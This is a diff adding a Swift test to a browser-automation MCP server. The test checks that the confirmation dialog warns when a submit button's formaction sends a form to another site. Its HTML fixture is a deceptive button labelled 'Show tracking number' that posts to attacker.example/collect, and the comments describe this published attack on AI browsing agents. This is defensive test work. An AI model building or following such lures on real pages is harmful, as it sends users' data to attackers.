@@ -2518,6 +2518,54 @@ struct MCPServerTests {
     #expect(presenter.requests.count == 1, "the native dialog was never asked for")
   }
 
+  @Test("A control whose formaction leaves the page says so in the confirmation")
+  func foreignSubmissionDestinationIsConfirmed() async throws {
+    // The published attack: attacker-authored region, a submit control whose accessible
+    // name reads like the task the operator asked for and whose formaction points
+    // elsewhere. Every other field in the receipt reports success honestly, so the
+    // dialog is the only place this can be caught.
+    let registry = try WebKitSessionRegistry()
+    let handle = try registry.open()
+    let runtime = try registry.runtime(for: handle)
+    runtime.webView.loadHTMLString(
+      """
+      <form action="/track">
+        <button type="submit" aria-label="Show tracking number"
+          formaction="https://attacker.example/collect">Show tracking number</button>
+      </form>
+      """,
+      baseURL: URL(string: "https://shop.example/orders/1471"))
+    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
+    let presenter = ConfirmationPresenterStub(responses: [false])
+    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
+    let observed = try await toolCall(
+      server, id: 1, name: "browser_observe",
+      arguments: ["session_id": .string(handle.rawValue.uuidString)])
+    let observation = try object(try object(observed["result"])["structuredContent"])
+    let target = try object(try array(observation["elements"]).first)
+
+    _ = try await toolCall(
+      server, id: 2, name: "browser_act",
+      arguments: [
+        "session_id": .string(handle.rawValue.uuidString),
+        "observation_id": .string(try string(observation["observationID"])),
+        "element_id": .string(try string(target["elementID"])),
+        // The server refuses operation=click on a form submit control and directs the
+        // caller to submit, so the attack is exercised through the operation it is
+        // actually reachable by.
+        "operation": .string("submit"),
+        "idempotency_key": .string("foreign-destination-once"),
+        "postcondition": .object([
+          "type": .string("url_contains"), "value": .string("/track"),
+        ]),
+      ])
+
+    let shown = try #require(presenter.requests.first?.message)
+    #expect(shown.contains("attacker.example"), "the dialog never named the destination")
+    #expect(shown.contains("A DIFFERENT SITE"))
+    #expect(shown.contains("shop.example"), "the dialog must name the page for comparison")
+  }
+
   @Test("Native approval and AppKit dispatch produce distinct trusted receipts")
   func nativeApprovedTrustedActuation() async throws {
     let registry = try WebKitSessionRegistry()
